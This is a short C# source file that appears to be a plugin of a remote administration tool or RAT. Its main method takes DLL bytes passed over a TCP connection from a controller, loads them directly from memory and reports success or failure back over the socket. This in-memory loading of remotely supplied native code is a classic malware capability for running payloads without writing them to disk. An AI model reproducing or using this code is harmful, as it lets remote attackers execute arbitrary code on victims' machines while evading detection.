using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using static PacketLib.Packet;

namespace PL
{
    public class Main
    {
        public static void main(TcpClient K, object[] Param_Tab)
        {

            byte[] dll_bytes = (byte[])(Param_Tab[1]);

            try
            {
                DLLFromMemory dll = new DLLFromMemory(dll_bytes);

                PacketMaker P = new PacketMaker();
                P.Type_Packet = PacketType.SUCCESS_LOAD_NATIVE_DLL;
                P.Misc = new object[] {"Dll was loaded successfully !"};
                Packet_Send Send = new Packet_Send();
                Send.Packet = P;

                lock (K)
                {
                    Send.Send(K.GetStream());
                }

            }
            catch (Exception ex)
            {
                //  MessageBox.Show(ex.ToString());

                PacketMaker P = new PacketMaker();
                P.Type_Packet = PacketType.ERROR_LOAD_NATIVE_DLL;
                P.Misc = new object[] {ex.ToString()};
                Packet_Send Send = new Packet_Send();
                Send.Packet = P;     
    
                lock (K)
                {
                    Send.Send(K.GetStream());
                }
    
            }
        }
    } 
}
